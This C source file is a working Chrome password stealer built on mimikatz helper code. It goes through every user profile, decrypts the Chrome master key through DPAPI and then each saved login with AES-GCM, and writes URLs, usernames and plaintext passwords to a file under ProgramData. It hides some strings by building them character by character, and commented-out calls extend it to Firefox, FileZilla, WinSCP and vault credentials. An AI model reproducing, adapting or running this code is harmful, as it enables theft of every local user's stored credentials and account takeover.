
#include "main.h"
#include "kull_m_process.h"

int get_path(char* ret, int id) {
	
	my_memset(ret, 0, sizeof(ret));
	SHGetFolderPath_A= (SHGetFolderPathA_) GetProcAddress(shell32_address, "SHGetFolderPathA");
	
	if (SUCCEEDED(SHGetFolderPath_A(NULL, id | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, ret))) {
		return 1;
	}
	return 0;
}

void chararray_to_bytearray(char* Char, BYTE* Byte, DWORD Length) {

	for (DWORD dwX = 0; dwX < Length; dwX++) {
		Byte[dwX] = (BYTE)Char[dwX];
	}
}

char* string_remove_substring(char* String, const char* Substring) {

	DWORD Length = my_strlen(Substring);
	char* pointer = String;

	if (Length == 0) {
		return NULL;
	}
	if ((pointer = my_strstr(pointer, Substring)) != NULL) {
		MoveMemory(pointer, pointer + Length, my_strlen(pointer + Length)+1);
	}
	return String;
}

char* string_terminate_string(char* String, int Character) {

	DWORD Length = my_strlen(String);

	for (DWORD Index = 0; Index < Length; Index++) {
		if (String[Index] == Character) {

			String[Index] = '\0';
			return &String[Index];
		}
	}
	return NULL;
}

BOOL string_to_hex(IN LPCWCHAR string, IN LPBYTE hex, IN DWORD size)
{
	DWORD i, j;
	BOOL result;

	result = (wcslen(string) == (size * 2));

	if (result)
	{
		for (i = 0; i < size; i++)
		{
			swscanf_s(&string[i * 2], L"%02x", &j);
			hex[i] = (BYTE)j;
		}
	}
	return result;
}

PCWCHAR WPRINTF_TYPES[] =
{
	L"%02x",		// WPRINTF_HEX_SHORT
	L"%02x ",		// WPRINTF_HEX_SPACE
	L"0x%02x, ",	// WPRINTF_HEX_C
	L"\\x%02x",		// WPRINTF_HEX_PYTHON
	L"%02X",		// WPRINTF_HEX_SHORT_CAP
};

void string_wprintf_hex(LPCVOID lpData, DWORD cbData, DWORD flags)
{
	DWORD i, sep = flags >> 16;
	PCWCHAR pType = WPRINTF_TYPES[flags & 0x0000000f];

	if ((flags & 0x0000000f) == 2)
		wprintf(L"\nBYTE data[] = {\n\t");

	for (i = 0; i < cbData; i++)
	{
		wprintf(pType, ((LPCBYTE)lpData)[i]);
		if (sep && !((i + 1) % sep))
		{
			wprintf(L"\n");
			if ((flags & 0x0000000f) == 2)
				wprintf(L"\t");
		}
	}
	if ((flags & 0x0000000f) == 2)
		wprintf(L"\n};\n");
}

char* CallbackSqlite3QueryObjectRoutine(DWORD len, char* enc_pass) {

	char pass[1024];
	BYTE* buf = NULL, *pointer = NULL, *decrypt_pass = NULL;
	DWORD len_pass = len, bytes_to_write = 0, bytes_written = 0;
	DWORD decrypt_pass_len = 0, decrypt_size = 0;
	BCRYPT_ALG_HANDLE bcrypt_handle = NULL;
	BCRYPT_KEY_HANDLE hkey = NULL;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	NTSTATUS status = 0;

	BCRYPT_INIT_AUTH_MODE_INFO(info);
	
	if (len_pass < 32){
		return 0;
	}

	CopyMemory(pass, enc_pass, len_pass);
	buf = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len_pass);
	if (buf == NULL) {
		goto FAIL;
	}

	chararray_to_bytearray(pass, buf, len_pass);
	pointer = buf + 3;
	status = BCryptOpenAlgorithmProvider(&bcrypt_handle, BCRYPT_AES_ALGORITHM, NULL, NULL);
	
	if (!NT_SUCCESS(status)) {
		goto FAIL;
	}

	status = BCryptSetProperty(bcrypt_handle, L"ChainingMode", (UCHAR*) BCRYPT_CHAIN_MODE_GCM, 0, NULL);
	if (!NT_SUCCESS(status)) {
		goto FAIL;
	}

	status = BCryptGenerateSymmetricKey(bcrypt_handle, &hkey, NULL, 0, Output.pbData, Output.cbData, 0);
	if (!NT_SUCCESS(status)) {
		goto FAIL;
	}

	info.pbNonce = pointer;
	info.cbNonce = 12;
	info.pbTag = (info.pbNonce + len_pass - 19);
	info.cbTag = 16;
	decrypt_pass_len = len_pass -3 - info.cbNonce - info.cbTag;
	decrypt_pass = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, decrypt_pass_len + 1);
	
	if (decrypt_pass == NULL) {
		goto FAIL;
	}

	status = BCryptDecrypt(hkey, (info.pbNonce + info.cbNonce), decrypt_pass_len, &info, NULL, 0, decrypt_pass, decrypt_pass_len, &decrypt_size, 0);
	if (!NT_SUCCESS(status)) {
		goto FAIL;
	}

	if (buf) {
		my_heapfree( buf);
	}

	if (bcrypt_handle) {
		BCryptCloseAlgorithmProvider(bcrypt_handle, 0);
	}

	if (hkey) {
		BCryptDestroyKey(hkey);
	}

	decrypt_pass[decrypt_pass_len] = '\0';
	return (char*)decrypt_pass;

	FAIL:
		if (buf) {
			my_heapfree( buf);
		}
		if (bcrypt_handle) {
			BCryptCloseAlgorithmProvider(bcrypt_handle, 0);
		}
		if (hkey) {
			BCryptDestroyKey(hkey);
		}

		return (char*) 0;
}
int get_dpapi_masterkey(char* profile_path, char* msft_protect_path, BOOL domain_pvk_path) {

	char localstate_path[260];
	char* substring, *pbBinary, *masterKey = NULL;
	DWORD masterkey_len = 0, enc_masterkey_len = 0, filesize = 0, read = 0, buf_len = 0;
	HANDLE file_handle;
	DATA_BLOB input;
	// masterkey_blob_guid
	UNICODE_STRING uString;
	PKULL_M_DPAPI_BLOB myblob;
	wchar_t buf[260], szmasterKey[260 * 2];

	my_memset(localstate_path, 0, 260);
	my_memcpy(localstate_path, profile_path, my_strlen(profile_path) + 1);
	my_strcat(localstate_path, "\\Google\\Chrome\\User Data\\Local State");

	file_handle = CreateFileA(localstate_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file_handle == INVALID_HANDLE_VALUE) {
		return 0;
	}

	filesize = GetFileSize(file_handle, NULL);
	if (filesize == INVALID_FILE_SIZE) {
		return 0;
	}

	char* localstate_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, filesize + 1);
	if (!localstate_buf) return 0;

	if (!ReadFile(file_handle, localstate_buf, filesize, &read, NULL)) {
		CloseHandle(file_handle);
		my_heapfree(localstate_buf);
		return 0;
	}

	CloseHandle(file_handle);
	substring = localstate_buf;
	substring = my_strstr(substring, "\"os_crypt\":{\"encrypted_key\":\"");
	string_remove_substring(substring, (char*)"\"os_crypt\":{\"encrypted_key\":\"");
	string_terminate_string(substring, '"');

	CryptStringToBinaryA(substring, (DWORD)my_strlen(substring), CRYPT_STRING_BASE64, NULL, &buf_len, NULL, NULL);
	pbBinary = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_len);
	if (!pbBinary) return 0;

	CryptStringToBinaryA(substring, (DWORD)my_strlen(substring), CRYPT_STRING_BASE64, pbBinary, &buf_len, NULL, NULL);
	
	input.cbData = buf_len - 5;
	input.pbData = pbBinary + 5;
	
  if (!CryptUnprotectData(&input, 0, NULL, NULL, NULL, 0, &Output))
  {
    goto FAIL;
  }

  my_heapfree(pbBinary);
  return 1;

  /*
   * turned off domain user decryption and replaced with
   * CryptUnprotectData function
   * the problem is msft_protect && domain_pvk_path option
  myblob = pbBinary + 5;

	if (NT_SUCCESS(RtlStringFromGUID(&myblob->guidMasterKey, &uString))) {
		my_memcpy(buf, uString.Buffer, uString.Length);
		buf[uString.Length / sizeof(wchar_t)] = L'\0';
	}

	if (msft_protect_path && domain_pvk_path) {
		HANDLE find = NULL;
		WIN32_FIND_DATA ffd;
		char dpapi_masterkey_path[260];

		my_memset(dpapi_masterkey_path, 0, 260);
		my_memcpy(dpapi_masterkey_path, msft_protect_path, my_strlen(msft_protect_path) + 1);
		my_strcat(dpapi_masterkey_path, "\\*");
		if ((find = FindFirstFileA(dpapi_masterkey_path, &ffd)) != INVALID_HANDLE_VALUE) {
			do {
				if (my_strcmp(ffd.cFileName, ".") == 0 || my_strcmp(ffd.cFileName, "..") == 0) {
					continue;
				}

				if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					char mskey[260], tmp[260];
					int filename_len = 0;

					filename_len = my_strlen(dpapi_masterkey_path);
					my_memcpy(mskey, dpapi_masterkey_path, filename_len + 1);
					my_memcpy(mskey + filename_len - 1, ffd.cFileName, strlen(ffd.cFileName) + 1);
					WideCharToMultiByte(CP_UTF8,0,buf, uString.Length, tmp, 260, NULL,NULL);
					my_sprintf(mskey, "%s\\%s", mskey, tmp + 1);
					mskey[my_strlen(mskey) - 1] = '\0';
					if (!PathFileExistsA(mskey)) continue;

					masterKey = kuhl_m_dpapi_masterkey(mskey, &masterkey_len);
					myRtlFreeUnicodeString(&uString);
					if (masterKey) {
						if (dpapi_unprotect(input.pbData, (BYTE*)masterKey, masterkey_len)) {
							Output.pbData[Output.cbData] = '\0';
							LocalFree(masterKey);
							my_heapfree(pbBinary);
							my_heapfree(localstate_buf);
							return 1;
						}
						LocalFree(masterKey);
					}
	
					goto FAIL;
				}
			} while (FindNextFile(find, &ffd));
			FindClose(find);
		}
		else {
			goto FAIL;
		}
	}


	wprintf(L"%ls\n masterkey: ", buf);
	wscanf(L"%ls", szmasterKey);
	myRtlFreeUnicodeString(&uString);
	masterkey_len = (DWORD)wcslen(szmasterKey);
	if (!(masterkey_len % 2)) masterkey_len >>= 1;

	masterKey = (char*) my_heapalloc(masterkey_len);
	if (masterKey) {
		string_to_hex(szmasterKey, (BYTE*)masterKey, masterkey_len);
		if (dpapi_unprotect(input.pbData, (BYTE*)masterKey, masterkey_len)) {
			Output.pbData[Output.cbData] = '\0';
			my_heapfree(masterKey);
			my_heapfree(pbBinary);
			my_heapfree(localstate_buf);
			return 1;
		}
		my_heapfree(masterKey);
	}

*/

FAIL:
	my_heapfree(pbBinary);
	my_heapfree(localstate_buf);
	return 0;

}

int fetch_pass(char* original_path, char* appdata_path, BOOL isdomain_user, BOOL domain_pvk_path) {

	char temp_path[260];
	DWORD fileSize = 0, read = 0;
	wchar_t wtemp_path[260 * 2];

	my_sprintf(temp_path, "%s%s", appdata_path, "\\chrtmp_db");
	if (!CopyFileA(original_path, temp_path, FALSE)) {
		return 0;
	}	

	mbstowcs(wtemp_path, temp_path, my_strlen(temp_path) + 1);
	if (SqlHandler(wtemp_path)) {
		if (ReadTable("logins")) {
			char* out, * pout;
			DWORD bytes_written;
			HANDLE file_to_write;
			BOOL isMasterkey = 0;

			out = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 64);
			pout = out;
			if (isdomain_user) {
				char msft_protect_path[260];

				my_sprintf(msft_protect_path, "%s", appdata_path);
				my_memcpy(msft_protect_path + strlen(msft_protect_path) - 5, "Roaming\\Microsoft\\Protect", 26);
				isMasterkey = get_dpapi_masterkey(appdata_path, msft_protect_path, domain_pvk_path);
			}
			else isMasterkey = get_dpapi_masterkey(appdata_path, NULL, FALSE);

			for (int i = 0; i < GetRowCount(); i++) {
				char* url = NULL, * username = NULL, * plain_password = NULL, *enc_password = NULL;
				DWORD password_len;

				url = GetValue(i, 1, 0);
				username = GetValue(i, 3, 0);
				enc_password = GetValue(i, 5, &password_len);
				if (isMasterkey) {
					plain_password = CallbackSqlite3QueryObjectRoutine(password_len, enc_password);
				}
				
        char url_user_pass[] = {'u','r','l',':',' ','%','s','\r','\n','u','s','e','r',':',' ','%','s','\r','\n','p','a','s','s',':',' ','%','s','\r','\n','\r','\n',0x0};
				my_sprintf(pout, url_user_pass, url, username, plain_password);
				pout += my_strlen(pout);
				if (plain_password) my_heapfree(plain_password);

			}

			if (Output.pbData) {
				LocalFree(Output.pbData);
				Output.cbData = 0;
			}

			char path[260];
			my_sprintf(path, "%s\\%s", programdata_path, "chrome_pass.txt");
			file_to_write = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (file_to_write) {
				char user[130];

				my_sprintf(user, "==%s==\r\n\r\n", appdata_path);
				WriteFile(file_to_write, user, my_strlen(user), &bytes_written, NULL);
				WriteFile(file_to_write, out, pout - out, &bytes_written, NULL);
				CloseHandle(file_to_write);
			}
			my_heapfree(out);
		}
		SqlHandleFree();
	}
	DeleteFileA(temp_path);
	return 1;
}

int chrome_passwords(BOOL isdomain_user) {

	HANDLE find = NULL;
	WIN32_FIND_DATA ffd;
	char originaldb_path[260], userprofile_dir[60], chromecred_path[] = {'\\','G','o','o','g','l','e','\\','C','h','r','o','m','e','\\','U','s','e','r',' ','D','a','t','a', 0x0};
	int profile = 1, profile_size = 60;
	BOOL domain_pvk_path = FALSE;

	if (!GetProfilesDirectoryA(userprofile_dir, (DWORD*)&profile_size)) {
		return 0;
	}

	if (isdomain_user) domain_pvk_path = TRUE;

	my_strcat(userprofile_dir, "\\*");
	find = FindFirstFileA(userprofile_dir, &ffd);
	if (find == INVALID_HANDLE_VALUE) {
		return 0;
	}

	do {
		if (my_strcmp(ffd.cFileName, ".") == 0 || my_strcmp(ffd.cFileName, "..") == 0) {
			continue;
		}

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char appdata_path[260];
			int filename_len;
			HANDLE find1;
			WIN32_FIND_DATA ffd1;

			if (my_strcmp(ffd.cFileName, "Default") == 0) continue;
			
			filename_len = my_strlen(userprofile_dir);
			my_memcpy(appdata_path, userprofile_dir, filename_len+1);
			my_memcpy(appdata_path + filename_len - 1, ffd.cFileName, strlen(ffd.cFileName)+1);
			my_strcat(appdata_path, "\\AppData\\Local");
			if (!PathIsDirectoryA(appdata_path)) {
				continue;
			}

			//get chrome passwords
      char default_logindata[] = {'\\','D','e','f','a','u','l','t','\\','L','o','g','i','n',' ','D','a','t','a',0x0};
			my_sprintf(originaldb_path, "%s%s%s", appdata_path, chromecred_path, default_logindata);
			find1 = FindFirstFileA(originaldb_path, &ffd1);
			if (find1 != INVALID_HANDLE_VALUE) {
				FindClose(find1);
				fetch_pass(originaldb_path, appdata_path, isdomain_user, domain_pvk_path);
				my_memset(originaldb_path, 0, 260);
			}

			while (1) {
				find1 = NULL;

				my_sprintf(originaldb_path, "%s%s%s%d%s", appdata_path, chromecred_path, "\\Profile ", profile, "\\Login Data");
				find1 = FindFirstFileA(originaldb_path, &ffd1);
				if (find1 == INVALID_HANDLE_VALUE) {
          if (profile > 10)
					    break;

          profile++;
          my_memset(originaldb_path, 0, 260);
          continue;
				}

				FindClose(find1);
				fetch_pass(originaldb_path, appdata_path, isdomain_user, domain_pvk_path);
				my_memset(originaldb_path, 0, 260);
				profile++;
			}
		}
	} while (FindNextFile(find, &ffd));

	FindClose(find);
	return 1;
}

/* __declspec(dllexport) void CALLBACK main(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) { */
int main(void) {
	char pProgramdata_path[260];
	BOOL isdomain_user = FALSE;
	wchar_t wide_cmdline[260 * 2];
	
	shell32_address = LoadLibraryA("Shell32.dll");
	programdata_path = pProgramdata_path;
	get_path(programdata_path, CSIDL_COMMON_APPDATA);
	my_strcat(programdata_path, "\\Report_2023");
	CreateDirectoryA(programdata_path, NULL);

	RtlStringFromGUID = (RtlStringFromGUID_) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlStringFromGUID");
	myRtlFreeUnicodeString = (RtlFreeUnicodeString_) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlFreeUnicodeString");
	NtQuerySystemInformation = (NtQuerySystemInformation_)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	NtQueryInformationProcess = (NtQueryInformationProcess_)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	
	//mbstowcs(wide_cmdline, lpszCmdLine, my_strlen(lpszCmdLine) + 1);
	//isdomain_user = kuhl_m_lsadump_bkey(wide_cmdline);
	//kuhl_m_sekurlsa_dpapi();
	chrome_passwords(isdomain_user);
	//firefox_passwords(NULL);
	//filezilla_passwords();
	//get_vault_creds();
	//winscp_passwords();
	//if (domain_pvk_buf) LocalFree(domain_pvk_buf);
}

/*
BOOL WINAPI DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	return TRUE;
}
*/